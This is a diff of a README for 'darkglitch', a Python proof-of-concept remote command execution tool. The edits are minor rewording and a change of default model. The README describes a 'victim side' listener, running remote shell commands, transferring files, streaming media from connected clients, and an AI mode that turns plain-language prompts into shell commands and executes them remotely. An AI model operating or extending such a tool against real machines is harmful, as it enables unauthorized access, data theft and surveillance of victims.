@@ -9,7 +9,7 @@ darkglitch is a lightweight Python proof-of-concept for remote command execution
 - run shell commands remotely
 - upload and download files
 - stream media from a connected client
-- generate a shell command from a natural-language prompt using an AI provider
+- turn a natural-language prompt into a shell command with an AI provider
 
 ## Requirements
 
@@ -27,7 +27,7 @@ source .venv/bin/activate
 pip install -e .
 ```
 
-If you want the AI prompt mode, install the Ollama client package as well:
+If you want to use the AI prompt mode, install the Ollama Python client as well:
 
 ```bash
 pip install ollama
@@ -42,7 +42,7 @@ HOST = "https://your-signal-server.example/"
 ROOM = "your-room"
 ```
 
-## Usage
+## Basic workflow
 
 ### 1. Start a listener (victim side)
 
@@ -68,7 +68,7 @@ python darkglitch.py -c <client_id> "whoami"
 python darkglitch.py -ai <client_id> "list all folders in root"
 ```
 
-This uses an Ollama-backed provider to turn your prompt into a shell command before executing it remotely.
+This uses an Ollama-backed provider to turn your prompt into a shell command before executing it remotely. If Ollama is unavailable or the model returns something unusable, the tool falls back to a simple built-in command.
 
 ### 5. Upload or download files
 
@@ -96,7 +96,7 @@ If you want to use the AI prompt mode, make sure Ollama is installed and running
 
 ```bash
 ollama serve
-ollama pull deepseek-r1:14b
+ollama pull llama3.2:3b
 ```
 
 You can override the default model and timeout if needed:
